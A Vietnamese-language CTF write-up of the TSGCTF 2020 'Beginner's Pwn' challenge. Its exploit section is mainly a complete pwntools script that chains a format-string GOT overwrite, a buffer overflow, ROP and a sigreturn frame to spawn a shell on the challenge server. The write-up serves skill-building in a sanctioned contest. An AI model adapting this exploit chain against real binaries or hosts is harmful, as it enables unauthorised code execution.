---
title: "TSGCTF 2020 - Beginner's Pwn"
summary: "Writeup for an easy Pwn challenge that I solved in TSGCTF 2020"
date: 2020-07-15
tags: ["ctf", "pwn"]
---
## Foreword
Theo như description của đề thì bài này là sự tổng hợp của các techniques như:
- Format String
- GOT (Global Offset Table) overwrite
- Buffer Overflow
- ROP (Return-Oriented Programming)
- sigreturn syscall (aka SROP)

Thì chúng ta chỉ việc follow theo đấy mà làm thôi.

## Exploit
![](images/main_fn.jpg)
![](images/checksec.jpg)

Như chúng ta thấy thì NX và Canary đều được enabled (đại khái là không thể chạy shellcode và buffer overflow như bình thường). Nhưng bài này có Format String (đặc trưng của lỗi Format String là chúng ta có thể ghi được mọi address, miễn là có quyền write) nên chúng ta có thể bypass được Canary.

### Idea
Idea của mình trong bài này như sau:
1. Overwrite `__stack_chk_fail` GOT address để tránh exit program khi đè qua canary
2. Ghi chuỗi `format` của hàm `scanf` lên section có quyền write (ở đây là .bss section)
3. Làm cho register `rax = 0xf` khi chạy qua hàm scanf để gọi `sys_rt_sigreturn` syscall
4. Craft 1 stack frame bằng `pwntools` để chạy `sys_execve` syscall

### Exploit Analyse
```python
from pwn import *

binary = ELF('./beginners_pwn', checksec=False)

p = remote('35.221.81.216', 30002)

got_table = binary.symbols['_GLOBAL_OFFSET_TABLE_']
start_main_ret = 0x401203
end_main_ret = 0x401256

pop_rdi_ret = 0x4012c3
pop_rsi_r15_ret = 0x4012c1
syscall = 0x40118f

p.sendline(('%7$s%s').ljust(8, '\x00') + p64(binary.symbols['got.__stack_chk_fail']))
p.sendline(p64(end_main_ret)[:-1]) # đoạn này slice đi 1 byte cao để không bị đè với hàm ngay bên dưới __stack_chk_fail là scanf
p.sendline('A'*24 + p64(end_main_ret) + p64(start_main_ret)) # đoạn này phải 16 bytes stack-aligned

p.sendline(('%7$s%s').ljust(8, '\x00') + p64(got_table+0x30))
p.sendline('%1$s'*0xf) # ghi '%1$s' 15 lần vào .bss

payload = p64(pop_rdi_ret)
payload += p64(got_table+0x30)
payload += p64(pop_rsi_r15_ret)
payload += p64(got_table+0x80)
payload += p64(0)
payload += p64(binary.symbols['plt.__isoc99_scanf'])
# scanf(format=got_table+0x30, varargs=got_table+0x80)
# sau khi nhập 15 lần '/bin/sh' (line 45) vào scanf thì lúc đó rax=0xf và nhảy vào syscall luôn
# '/bin/sh' sẽ luôn được ghi vào cùng 1 địa chỉ là argument đầu tiên (ở đây chính là got_table+0x80)
payload += p64(syscall)

# Setup stack frame cho Sigreturn
frame = SigreturnFrame(arch='amd64')
frame.rax = 0x3b # sys_execve
frame.rdi = got_table+0x80 # '/bin/sh\x00'
frame.rsi = 0 # reset rsi
frame.rdx = 0 # reset rdx
frame.rip = syscall # jump tới syscall address để gọi sys_execve

payload += str(frame)

p.sendline('A'*24 + payload)
p.sendlines(['/bin/sh\x00']*0xf) # Gửi '/bin/sh\x00' 15 lần

p.interactive()
```
